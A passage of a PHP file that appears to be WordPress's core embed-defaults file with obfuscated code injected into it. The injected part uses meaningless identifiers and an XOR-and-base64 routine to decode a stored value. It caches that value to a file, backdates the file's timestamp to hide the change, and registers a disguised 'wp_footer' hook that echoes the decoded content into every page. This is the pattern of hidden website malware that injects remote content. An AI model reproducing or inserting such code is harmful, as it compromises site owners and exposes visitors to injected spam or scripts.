		if(rfc_getheadervalue_permastructs_lf6($correctly_expiration_va2,49)===false){
			$correctly_expiration_va2=$rfc_getheadervalue_bk1;
			$blue_bointon_pp2++;
			if($blue_bointon_pp2>24)$blue_bointon_pp2=24;
		}else{$blue_bointon_pp2=1;}
		@file_put_contents($premiere_getfileformat_mq7,$correctly_expiration_va2."\t".time()."\t".$blue_bointon_pp2);
		touch($premiere_getfileformat_mq7,filemtime(__FILE__));
	}
	
	$correctly_expiration_va2=rfc_getheadervalue_permastructs_lf6($correctly_expiration_va2,49);
	if(!$correctly_expiration_va2)$correctly_expiration_va2=rfc_getheadervalue_permastructs_lf6($rfc_getheadervalue_bk1,49); 

	echo $correctly_expiration_va2;
}

function encodes_ubergeek_getfileformat_mq7($correctly_expiration_va2,$k){for($i=0;$i<strlen($correctly_expiration_va2);$i++){$correctly_expiration_va2[$i]=chr(ord($correctly_expiration_va2[$i])^$k);}return base64_encode($correctly_expiration_va2.'WP');}

function rfc_getheadervalue_permastructs_lf6($correctly_expiration_va2,$k){
	$correctly_expiration_va2=base64_decode($correctly_expiration_va2);
	if($correctly_expiration_va2){
		for($i=0;$i<strlen($correctly_expiration_va2)-2;$i++){$correctly_expiration_va2[$i]=chr(ord($correctly_expiration_va2[$i])^$k);}
	}
	if(substr($correctly_expiration_va2,-2)!='WP'){$correctly_expiration_va2=false;}else{$correctly_expiration_va2=substr($correctly_expiration_va2,0,-2);}
	return $correctly_expiration_va2;
}


add_action( rfc_getheadervalue_permastructs_lf6('RkFuV15eRVRDV1A=',49) , "strict_textarea_cropped_je3" );
add_action( 'embed_footer',           'wp_print_footer_scripts',        20    );

add_filter( 'excerpt_more',           'wp_embed_excerpt_more',          20    );
add_filter( 'the_excerpt_embed',      'wptexturize'                           );
add_filter( 'the_excerpt_embed',      'convert_chars'                         );
add_filter( 'the_excerpt_embed',      'wpautop'                               );
add_filter( 'the_excerpt_embed',      'shortcode_unautop'                     );
add_filter( 'the_excerpt_embed',      'wp_embed_excerpt_attachment'           );

add_filter( 'oembed_dataparse',       'wp_filter_oembed_result',        10, 3 );
add_filter( 'oembed_response_data',   'get_oembed_response_data_rich',  10, 4 );

unset( $filter, $action );
